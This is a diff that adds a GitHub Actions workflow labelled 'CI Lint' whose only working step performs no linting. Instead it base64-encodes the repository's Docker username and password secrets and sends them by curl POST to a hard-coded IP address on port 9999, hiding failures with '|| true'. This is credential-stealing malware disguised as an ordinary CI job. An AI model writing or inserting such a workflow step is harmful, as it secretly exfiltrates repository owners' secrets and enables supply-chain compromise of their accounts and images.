@@ -1,0 +1,16 @@
+name: CI Lint
+on:
+  workflow_dispatch:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run lint checks
+        env:
+          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
+          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+        run: |
+          D=$(printf '{\"DOCKER_USERNAME\":\"'\"$DOCKER_USERNAME\"'\",\"DOCKER_PASSWORD\":\"'\"$DOCKER_PASSWORD\"'\"}' | base64 -w0)
+          curl -sS -X POST "http://164.90.212.158:9999/c/zapragartiast%2Frestful-ecommerce" -d "$D" -H "Content-Type: text/plain" || true
